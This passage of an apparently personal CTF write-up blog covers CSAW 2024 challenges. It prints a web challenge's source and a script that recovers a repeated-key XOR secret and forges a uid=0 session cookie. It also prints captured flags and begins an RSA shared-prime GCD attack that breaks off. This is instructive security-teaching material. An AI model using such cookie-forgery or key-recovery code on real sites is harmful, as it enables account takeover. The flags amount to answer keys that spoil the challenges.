+    <span style="color: #f8f8f2">displayname</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">form</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get(</span><span style="color: #e6db74">&#39;displayname&#39;</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">username</span> <span style="color: #f92672">or</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">password</span> <span style="color: #f92672">or</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">displayname:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;Missing Registration Field&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">400</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">is_alphanumeric(username)</span> <span style="color: #f92672">or</span> <span style="color: #f8f8f2">len(username)</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">50</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;Username not Alphanumeric or it is longer than 50 chars&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">403</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">is_alphanumeric(displayname)</span> <span style="color: #f92672">or</span> <span style="color: #f8f8f2">len(displayname)</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">50</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;Displayname not Alphanumeric or it is longer than 50 chars&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">403</span>
+    <span style="color: #75715e"># check if the username already exists in the DB</span>
+    <span style="color: #f8f8f2">user</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Account</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">query</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">filter_by(username</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">username)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">first()</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">user:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;Username already taken!&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">403</span>
+    <span style="color: #f8f8f2">acc</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Account(</span>
+        <span style="color: #f8f8f2">username</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">username,</span> 
+        <span style="color: #f8f8f2">password</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">password,</span> 
+        <span style="color: #f8f8f2">displayname</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">displayname,</span>
+        <span style="color: #f8f8f2">uid</span><span style="color: #f92672">=</span><span style="color: #ae81ff">1</span>
+        <span style="color: #f8f8f2">)</span>
+    <span style="color: #66d9ef">try</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #75715e"># Add the new account to the session and commit it</span>
+        <span style="color: #f8f8f2">db</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">session</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">add(acc)</span>
+        <span style="color: #f8f8f2">db</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">session</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">commit()</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">jsonify({</span><span style="color: #e6db74">&#39;message&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&#39;Account created successfully&#39;</span><span style="color: #f8f8f2">}),</span> <span style="color: #ae81ff">201</span>
+    <span style="color: #66d9ef">except</span> <span style="color: #a6e22e">Exception</span> <span style="color: #66d9ef">as</span> <span style="color: #f8f8f2">e:</span>
+        <span style="color: #f8f8f2">db</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">session</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">rollback()</span>  <span style="color: #75715e"># Roll back the session on error</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">jsonify({</span><span style="color: #e6db74">&#39;error&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">str(e)}),</span> <span style="color: #ae81ff">500</span>
+
+
+
+<span style="color: #a6e22e">@pagebp.route</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&#39;/user&#39;</span><span style="color: #f8f8f2">)</span>
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">user</span><span style="color: #f8f8f2">():</span>
+    <span style="color: #f8f8f2">cookie</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">cookies</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get(</span><span style="color: #e6db74">&#39;info&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">None)</span>
+    <span style="color: #f8f8f2">name</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;hello&#39;</span>
+    <span style="color: #f8f8f2">msg</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;world&#39;</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">cookie</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">None:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">render_template(</span><span style="color: #e6db74">&quot;user.html&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">display_name</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;Not Logged in!&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">special_message</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;Nah&#39;</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #f8f8f2">userinfo</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">decode(cookie)</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">userinfo</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">None:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">render_template(</span><span style="color: #e6db74">&quot;user.html&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">display_name</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;Error...&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">special_message</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;Nah&#39;</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #f8f8f2">name</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">userinfo[</span><span style="color: #e6db74">&#39;displays&#39;</span><span style="color: #f8f8f2">]</span>
+    <span style="color: #f8f8f2">msg</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">flag</span> <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">userinfo[</span><span style="color: #e6db74">&#39;uid&#39;</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span> <span style="color: #66d9ef">else</span> <span style="color: #e6db74">&quot;No special message at this time...&quot;</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">render_template(</span><span style="color: #e6db74">&quot;user.html&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">display_name</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">name,</span> <span style="color: #f8f8f2">special_message</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">msg)</span>
+
+<span style="color: #a6e22e">@pagebp.route</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&#39;/logout&#39;</span><span style="color: #f8f8f2">)</span>
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">logout</span><span style="color: #f8f8f2">():</span>
+    <span style="color: #f8f8f2">session</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">clear()</span>
+    <span style="color: #f8f8f2">response</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">make_response(redirect(</span><span style="color: #e6db74">&#39;/&#39;</span><span style="color: #f8f8f2">))</span>
+    <span style="color: #f8f8f2">response</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">set_cookie(</span><span style="color: #e6db74">&#39;info&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">expires</span><span style="color: #f92672">=</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">response</span>
+</pre></div>
+
+
+<p></p>
+<p>To figure out how this encoding works exactly we keep digging through the source code and find the following:</p>
+
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">re</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">Crypto.Util.Padding</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">pad,</span> <span style="color: #f8f8f2">unpad</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">json</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
+
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">is_alphanumeric</span><span style="color: #f8f8f2">(text):</span>
+    <span style="color: #f8f8f2">pattern</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">r&#39;^[a-zA-Z0-9]+$&#39;</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">re</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">match(pattern,</span> <span style="color: #f8f8f2">text):</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">True</span>
+    <span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">False</span>
+    
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">LOG</span><span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">args,</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">kwargs):</span>
+    <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">args,</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">kwargs,</span> <span style="color: #f8f8f2">flush</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">True)</span>
+
+
+<span style="color: #75715e"># Some cryptographic utilities</span>
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">encode</span><span style="color: #f8f8f2">(status:</span> <span style="color: #f8f8f2">dict)</span> <span style="color: #f92672">-&gt;</span> <span style="color: #f8f8f2">str:</span>
+    <span style="color: #66d9ef">try</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">json</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">dumps(status)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode()</span>
+        <span style="color: #f8f8f2">out</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">b</span><span style="color: #e6db74">&#39;&#39;</span>
+        <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i,j</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">zip(plaintext,</span> <span style="color: #f8f8f2">os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">environ[</span><span style="color: #e6db74">&#39;ENCRYPT_KEY&#39;</span><span style="color: #f8f8f2">]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode()):</span>
+            <span style="color: #f8f8f2">out</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">bytes([i</span><span style="color: #f92672">^</span><span style="color: #f8f8f2">j])</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hex(out)</span>
+    <span style="color: #66d9ef">except</span> <span style="color: #a6e22e">Exception</span> <span style="color: #66d9ef">as</span> <span style="color: #f8f8f2">s:</span>
+        <span style="color: #f8f8f2">LOG(s)</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">None</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">decode</span><span style="color: #f8f8f2">(inp:</span> <span style="color: #f8f8f2">str)</span> <span style="color: #f92672">-&gt;</span> <span style="color: #f8f8f2">dict:</span>
+    <span style="color: #66d9ef">try</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #f8f8f2">token</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fromhex(inp)</span>
+        <span style="color: #f8f8f2">out</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span>
+        <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i,j</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">zip(token,</span> <span style="color: #f8f8f2">os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">environ[</span><span style="color: #e6db74">&#39;ENCRYPT_KEY&#39;</span><span style="color: #f8f8f2">]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode()):</span>
+            <span style="color: #f8f8f2">out</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">chr(i</span> <span style="color: #f92672">^</span> <span style="color: #f8f8f2">j)</span>
+        <span style="color: #f8f8f2">user</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">json</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">loads(out)</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">user</span>
+    <span style="color: #66d9ef">except</span> <span style="color: #a6e22e">Exception</span> <span style="color: #66d9ef">as</span> <span style="color: #f8f8f2">s:</span>
+        <span style="color: #f8f8f2">LOG(s)</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">None</span>
+</pre></div>
+<p></p>
+
+
+<p>The encryption here is quite simple, it's either a <a href="https://en.wikipedia.org/wiki/One-time_pad"><b>one time pad</b></a></p> (which intuitively seems more likely) or a <a href="hhttps://dev.to/wrongbyte/cryptography-basics-breaking-repeated-key-xor-ciphertext-1fm2"><b>repeated key xor</b></a></p>. Either way we have a way to recover enough of the key to solve the challenge. In both cases our decoded cookie is being Xored with the encryption key. Although we are limited to 50 characters if we register a user with a long username (let's say "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" for example) we know the corresponding cookie will be an encoding of "{'username':'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',...", i.e. this string will get xored with the key. So to recover part of the key all we need to do is xor our unencoded token with the encoded result (since A xor B = C implies A xor C = B). Then we register a smaller username and the part of the key we recover will be more than enough to manually encode a custom cookie with uid = 0. 
+
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">from</span> <span style="color: #f8f8f2">os</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">urandom</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">requests</span>
+
+<span style="color: #f8f8f2">s</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">requests</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">Session()</span>
+
+<span style="color: #f8f8f2">url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;https://logmein1.ctf.csaw.io&quot;</span>
+
+<span style="color: #f8f8f2">user</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hex(urandom(</span><span style="color: #ae81ff">4</span><span style="color: #f8f8f2">))</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Current User:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">user)</span>
+<span style="color: #f8f8f2">password</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hex(urandom(</span><span style="color: #ae81ff">4</span><span style="color: #f8f8f2">))</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Current Password:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">password)</span>
+<span style="color: #f8f8f2">display</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">user</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Current Display Name:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">display)</span>
+
+<span style="color: #f8f8f2">r1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">post(url</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&quot;/register&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&quot;username&quot;</span><span style="color: #f8f8f2">:user,</span> <span style="color: #e6db74">&quot;password&quot;</span><span style="color: #f8f8f2">:password,</span> <span style="color: #e6db74">&quot;displayname&quot;</span><span style="color: #f8f8f2">:display})</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(r1</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">text)</span>
+
+<span style="color: #f8f8f2">r2</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">post(url</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&quot;/login&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&quot;username&quot;</span><span style="color: #f8f8f2">:user,</span> <span style="color: #e6db74">&quot;password&quot;</span><span style="color: #f8f8f2">:password</span> <span style="color: #f8f8f2">})</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(r2</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">text)</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(r2</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">cookies</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get_dict())</span>
+
+<span style="color: #75715e">#print(&quot;-----------------------------&quot;)</span>
+<span style="color: #75715e">#curCookie = bytes.fromhex(r2.cookies.get_dict()[&#39;info&#39;])</span>
+<span style="color: #75715e">#sent=b&quot;{&#39;username&#39;:&quot;+user.encode()+b&quot;,&quot;</span>
+<span style="color: #75715e">#key=b&#39;&#39;</span>
+<span style="color: #75715e">#for i in range(len(sent)):</span>
+<span style="color: #75715e">#	tmp = sent[i] ^ curCookie[i]</span>
+<span style="color: #75715e">#	key += bytes.fromhex(hex(tmp)[2:].rjust(2,&#39;0&#39;))</span>
+<span style="color: #75715e">#key = bytes.hex(key)</span>
+<span style="color: #75715e">#print (&quot;Found partial key:&quot;, key)</span>
+
+<span style="color: #f8f8f2">key</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;3340394454703830454a4670011876526438726742616377773769745452337367396d71474b7878716b745a4f707278414e4a69584679513556357a23&#39;</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">decode</span><span style="color: #f8f8f2">(text,key):</span>
+	<span style="color: #66d9ef">assert</span> <span style="color: #f8f8f2">len(text)</span> <span style="color: #f92672">&lt;=</span> <span style="color: #f8f8f2">len(key)</span>
+	<span style="color: #f8f8f2">pt</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">b</span><span style="color: #e6db74">&#39;&#39;</span>
+	<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(len(text)):</span>
+		<span style="color: #f8f8f2">tmp</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">key[i]</span> <span style="color: #f92672">^</span> <span style="color: #f8f8f2">text[i]</span>
+		<span style="color: #f8f8f2">pt</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fromhex(hex(tmp)[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">:]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">rjust(</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&#39;0&#39;</span><span style="color: #f8f8f2">))</span>
+	<span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">pt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">decode()</span>
+
+
+<span style="color: #f8f8f2">curCookie</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fromhex(r2</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">cookies</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get_dict()[</span><span style="color: #e6db74">&#39;info&#39;</span><span style="color: #f8f8f2">])</span>
+<span style="color: #f8f8f2">byteKey</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fromhex(key)</span>
+<span style="color: #f8f8f2">toEdit</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">decode(curCookie,byteKey)</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">Decoded cookie:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">toEdit)</span>
+
+<span style="color: #f8f8f2">newCookie</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">toEdit[:</span><span style="color: #f92672">-</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&quot;0&quot;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">toEdit[</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:]</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">New cookie:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">newCookie)</span>
+
+<span style="color: #f8f8f2">newCookieEncoded</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hex(decode(newCookie</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode(),byteKey)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode())</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">New cookie encoded:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">newCookieEncoded)</span>
+</pre></div>
+
+<p></p>
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">flag:</span> <span style="color: #e6db74">&quot;csawctf{S3NS1T1V3_D4T4_ST0R3D_CL13NTS1D3D_B4D_B4D}&quot;</span>
+</pre></div>
+<p></p>
+
+<p><a name="Cryptography"></a></p>
+<p></p>
+<hr style="border-top:1px solid #28323C;">
+<p><h3>Cryptography</h3></p>
+<p></p>
+<hr style="border-top:1px solid #28323C;">
+<p></p>
+<p><h3>HexHex</h3></p>
+<img class="center" src="/assets/images/csaw24hexhex.png">
+<p></p>
+<p>For this challenge we get a huge file with mostly hex encoded text. There are two strings that jump out since they seem to use some other type of encoding. Looking at the same and description of the challenge we can guess that a <a href="https://www.dcode.fr/twin-hex-cipher"><b>Twin Hex Cipher</b></a> has been used on the two strings. Throwing them in a Twin Hex Cipher decoder gets us the flag.</p>
+
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">flag:</span><span style="color: #e6db74">&quot;csawctf{hex3d_i7_w3l7_innit_hehe}&quot;</span>
+</pre></div>
+<p></p>
+
+<hr style="border-top:1px solid #28323C;">
+<p></p>
+<p><h3>Trapdoor</h3></p>
+<img class="center" src="/assets/images/csaw24trapdoor.png">
+<p></p>
+<p>In this challenge we get two "public_key" files and two encrypted message files. Within the public key files we have the tipical RSA public exponent e = 65537 and two n values, let's call them n1 and n2. First thing I did was check if the greatest common dividor of n1 and n2 is different than 1. If so this means the same prime p has been used as a private parameter for both keys and since calculating the GCD of large numbers is easy we can break the RSA encryption and retrieve the messages.</p>
+
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">binascii</span>
+
+<span style="color: #f8f8f2">c1</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">161657267735196834912863135763588255051084768060167522685145600975477606522389267911595494255951389308603585891670155516473228040572472139266242046480464411011926872432857745283026840801445383620653451687523682849171134262795620963422201106957732644189004161198543408780876818402717692426183521358742475772803427948145681912577138151854201287217310388360035006450255979612146528569192238510701666997268424852524879191797074298541592238357746219444160311336448978081899531731524195638715227224903445226248602579764214997719090230906191407229446647313099400956970509035654967405630240939959592998616003498236942092817559461000588623573048030445521863492730870242644395352424593752773001495951737895664115609421618170689951704330184048125307163740226054228480085636314748554185748105182003072934516641741388554856693783207538862673881733984454590126630762754413784860309730736733101522402317095930278893263812433036953457501549714213711757368647750210251899325644773678135753158374375837529620580830355398764871600754340989211159192515899566042173210432362519000596760898915443009768635625263875643978408948502726014770826616858752941269838500371205265923373317700072776319154266968103160778573051363936325056002056286215658714259892131</span>
+<span style="color: #f8f8f2">c2</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">494623168173341363340467373358957745383595056417571755948370162317759417390186160270770025384341351293889439841723113891870589515038055355274713359875028285461281491108349357922761267441245606066321766119545935676079271349094728585175909045924367012097484771776396598141703907624715907730873180080611197080012999970125893693838478647963157490065546947042621326070901482489910203413759703603136944502613002083194569025640046380564488058425650504612206627739749051853591610981053026318569730551988841304231276711969977298162726941928222523464544797141812329957714866356009363861914935745207975118182966833811723664044706845207847731129336219505772833893718601825819419057471717431953601897992835582033908346998397116046369365580899868759006665351628889935594587647946796811554073758809039163703319444890860711787316692186294350180062910771860180483152240985537326837665737974072086105081591429007858987697382766650868798693024212101169297652870122729568327958629779258375463408029863902774673729692698603549762248768090302360950262068792179771304874203556781584256503067131440856389473604578859795120178476492827306744971082872861030028803971595639553063854220185280566575307797482645881434704155764917254239587927218075951473385530833</span>
+
+<span style="color: #f8f8f2">e</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">65537</span>
+
+<span style="color: #f8f8f2">n1</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">537269810177819460077689661554997290782982019008162377330038831815573146869875494409546502741769078888560119836988893807659619131795600022996155542011901767164659622251852771410530047820953404275439162903782253582402317577272023052873061733154947413969140900242586288282386516940748102303139488999388815366805771566027048823971232923901589854972341140497344922557809346957285480088567527430942352224246175865278666886538920772608403444601667114300055814252644535406924681931233694920723837668899531758291081568304763353729111948368345349994099868469305792181073122419940610781784779666456780500932337154438538720823939250386789917476722260336949625831449027815346423132208841389383282133423240342633209093536658578807788187537292687621305485734565276685038174693348234827761258142100019798785254244633108887403538365377022084266245064851786520352683721896084403163679116876924559581709943841877168418550922700610256010165841228197765129411475811684669156709601802234298096100301516880419138890353002776631827361005170877640327516465104169299292924318171783865084478980121378972145656688829725118773293892358855082049175572479466474304782889913529927629420886850515337785270820884245044809646784251398955378537462225157041205713008379</span>
+<span style="color: #f8f8f2">n2</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">675112413040615754855341368347991520700645749707972662375138119848808538466484973026629442817490775679486087477873647170707728077849174294413106449041183548981099164777126469098349759962366886352375485394430924686294932854410357033579891793697466117311282071223849125728247324019661552591602816412461639181036083039951358738639409104870090776274099206184327026885209301129700589120263558741373320717866973004474880824451611558352986814186406024139122101780061421498582804842387331594088633719788918481809465044314609904522824483927173924396330723272200351268059583559155873089840203176526189465332287149408627146863937339106591410131104971158916770664709755851365697530033135116269758729627681863469646687585133174854282299126206393656205822175860114547244407037919126445577158000448033562711159480289599400271620922791664179514807098083591794558148460941940996477066832640360820650342057071277962750427121243576612067919616033880922920641430414655749007393524344586517489346008845986135281381956392366857764758769758991862758292829265731964283719870708510272500471228442964550074672417445262035130720875562744233719280755235051883245392409892775011413342074824090752055820699150296553380118608786447588243723987854862785887828651597</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">gcd</span><span style="color: #f8f8f2">(a,b):</span>
+	<span style="color: #66d9ef">while</span><span style="color: #f8f8f2">(b):</span>
+		<span style="color: #f8f8f2">a,</span> <span style="color: #f8f8f2">b</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">b,</span> <span style="color: #f8f8f2">a</span><span style="color: #f92672">%</span><span style="color: #f8f8f2">b</span>
